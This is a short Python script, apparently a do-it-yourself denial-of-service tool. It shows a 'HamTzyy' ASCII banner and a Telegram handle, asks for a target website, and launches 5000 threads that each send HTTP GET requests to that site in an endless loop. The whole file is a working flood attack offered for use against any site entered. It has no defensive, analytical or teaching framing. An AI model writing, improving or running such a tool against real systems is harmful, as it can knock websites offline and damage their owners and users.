import os
import threading
import requests
import pyfiglet
from termcolor import colored

# Ekranı temizleme fonksiyonu
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Ekranı temizle
clear_screen()

# Büyük ASCII "HackLab" yazısı (Kırmızı)
ascii_banner = pyfiglet.figlet_format("HamTzyy")
print(colored(ascii_banner, 'red'))

# Küçük kırmızı "Youtube: HackLab" yazısı
print(colored("Telegram: @Hamzzzt", 'red'))

# Kullanıcıdan hedef siteyi al
target_url = input("\nMasukkan situs target (http:// atau https:// ): ")

# Aynı anda çalışacak istek sayısı
num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"[+] Permintaan terkirim! Kode Status:: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Kesalahan! Server tidak merespons.")

# Thread’leri başlat
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Thread’lerin bitmesini bekle
for t in threads:
    t.join()
